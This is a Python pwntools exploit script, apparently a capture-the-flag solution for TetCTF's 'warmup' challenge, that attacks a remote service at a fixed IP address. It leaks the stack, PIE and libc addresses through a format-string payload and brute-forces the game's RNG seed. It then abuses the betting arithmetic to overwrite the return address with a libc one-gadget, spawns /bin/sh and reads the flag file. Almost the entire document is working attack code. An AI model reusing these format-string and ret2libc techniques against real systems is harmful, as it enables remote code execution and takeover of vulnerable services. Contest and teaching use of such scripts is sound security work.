#!/usr/bin/env python3
from pwn import *


def connect():
    if args.LOCAL:
        return gdb.debug(["./warmup.dbg"], api=True)
    else:
        return remote("192.46.228.70", 32337)


class Rng:
    # https://stackoverflow.com/a/26630526/3832536

    def __init__(self, seed):
        self.r = [seed] * 344
        for i in range(1, 31):
            self.r[i] = (16807 * self.r[i - 1]) % 2147483647
        for i in range(31, 34):
            self.r[i] = self.r[i - 31]
        for i in range(34, 344):
            self.r[i] = self.r[i - 31] + self.r[i - 3]
        self.n = 0

    def next(self):
        x = self.r[(self.n + 313) % 344] + self.r[(self.n + 341) % 344]
        self.r[self.n % 344] = x
        self.n = (self.n + 1) % 344
        return (x >> 1) & 0x7FFFFFFF


def test_rng():
    rng = Rng(0x5B0C30)
    val1 = rng.next()
    assert val1 == 0x796658EA, hex(val1)
    val2 = rng.next()
    assert val2 == 0x6D577178, hex(val2)


def main():
    test_rng()
    with connect() as tube:
        if args.LOCAL:
            tube.gdb.continue_nowait()
        tube.sendlineafter("How much money you want? ", "0")
        rbp_stkidx = 5
        ret_stkidx = 6
        game_stkidx = 8
        ret2libc_stackidx = 24
        stkidx2pos = 5
        feedback_addr_lsb = 0x58  # g_money@0x50
        fmt = ("%{}$016lx" * 4 + "%{}c%{}$hhn").format(
            rbp_stkidx + stkidx2pos,
            ret_stkidx + stkidx2pos,
            game_stkidx + stkidx2pos,
            ret2libc_stackidx + stkidx2pos,
            (feedback_addr_lsb - 16 * 4) & 0xFF,
            game_stkidx + stkidx2pos,
        )
        tube.recvuntil("Player name: ")
        if args.LOCAL:
            tube.gdb.interrupt_and_wait()
            tube.gdb.Breakpoint("printf", temporary=True)
            tube.gdb.continue_nowait()
        tube.sendline(fmt)
        if args.LOCAL:
            tube.gdb.wait()
            print(tube.gdb.execute("x/64a $rsp", to_string=True))
            tube.gdb.Breakpoint("srand", temporary=True)
            tube.gdb.continue_nowait()
        tube.recvuntil("Danh de ra de ma` o? =]]                         *\n")
        tube.recvuntil("**************************************************\n")
        rbp = int(tube.recvn(16), 16)
        print("rbp = 0x{:x}".format(rbp))
        pie = int(tube.recvn(16), 16) - 0xE9F
        print("pie = 0x{:x}".format(pie))
        assert pie & 0xFFF == 0
        game = int(tube.recvn(16), 16)
        print("game = 0x{:x}".format(game))
        feedback = game - 0x410
        print("feedback = 0x{:x}".format(feedback))
        libc = int(tube.recvn(16), 16) - 0x20840
        print("libc = 0x{:x}".format(libc))
        assert libc & 0xFFF == 0
        bet1 = 1
        if args.LOCAL:
            tube.gdb.wait()
            seed = int(tube.gdb.parse_and_eval("$rdi"))
            actual_feedback = int(tube.gdb.parse_and_eval("(unsigned long)g_feedback"))
            assert feedback == actual_feedback, hex(actual_feedback)
            tube.gdb.continue_nowait()
        tube.sendlineafter("Your bet (= 0 to exit): ", str(bet1))
        guess1 = 0
        tube.sendlineafter("Your choice: ", str(guess1))
        tube.recvuntil("Lucky number: ")
        rand11 = int(tube.recvline())
        print("rand11 = 0x{:x}".format(rand11))
        tube.recvuntil("Your money: ")
        suffix = " ZWD\n"
        money1 = feedback
        money2 = int(tube.recvuntil(suffix)[: -len(suffix)])
        if rand11 == guess1:
            # money2 = money1 + bet1 + rand12
            rand12 = (money2 - money1 - bet1) & 0xFFFFFFFFFFFFFFFF
        else:
            # money2 = money1 - bet1 - rand12
            rand12 = (money1 - money2 - bet1) & 0xFFFFFFFFFFFFFFFF
        print("rand12 = 0x{:x}".format(rand12))
        if not args.LOCAL:
            for seed in range(0x1000000):
                rng = Rng(seed)
                if rng.next() == rand11:
                    if rng.next() == rand12:
                        break
            else:
                raise Exception("Could not determine seed")
        print("seed = 0x{:x}".format(seed))
        rng = Rng(seed)
        val1 = rng.next()
        assert val1 == rand11, hex(val1)
        val2 = rng.next()
        assert val2 == rand12, hex(val2)
        rand21 = rng.next()
        rand22 = rng.next()
        money3 = rbp + 40  # pointer to return address from main_1() to main()
        # money3 = money2 + bet2 + rand22
        bet2 = (money3 - money2 - rand22) & 0xFFFFFFFFFFFFFFFF
        tube.sendlineafter("Your bet (= 0 to exit): ", str(bet2))
        tube.sendlineafter("Your choice: ", str(rand21))
        tube.sendlineafter("Your bet (= 0 to exit): ", "0")
        tube.recvuntil("Send to author your feeback: ")
        """
0x45226 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4527a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf0364 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1207 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
"""
        tube.send(
            flat(
                {0: b"".join((struct.pack("<Q", libc + 0x4527A),))},
                filler=b"\x00",
                length=0x400,
            )
        )
        tube.sendline("cat /home/warmup/flag")
        tube.interactive()  # TetCTF{viettel: *100*311267385452644#}


if __name__ == "__main__":
    main()
